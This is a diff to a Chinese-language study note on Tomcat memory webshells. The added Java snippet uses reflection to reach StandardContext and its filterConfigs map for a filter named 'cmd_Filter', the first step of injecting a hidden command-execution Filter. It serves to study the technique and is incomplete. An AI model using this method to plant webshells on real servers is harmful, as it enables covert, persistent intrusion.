@@ -256,7 +256,25 @@ StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
 
 标准思路是这样的
 ![](picture/Pasted%20image%2020260105212912.png)
-
+先是通过反射获取到 standContext
+```java
+ServletContext servletContext = request.getSession().getServletContext();  
+  
+ Field appctx = servletContext.getClass().getDeclaredField("context");  
+ appctx.setAccessible(true);  
+ ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
+  
+ Field stdctx = applicationContext.getClass().getDeclaredField("context");  
+ stdctx.setAccessible(true);  
+ StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
+  
+  
+  
+ String FilterName = "cmd_Filter";  
+ Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
+ Configs.setAccessible(true);  
+ filterConfigs = (Map) Configs.get(standardContext); 
+```
 
 
 
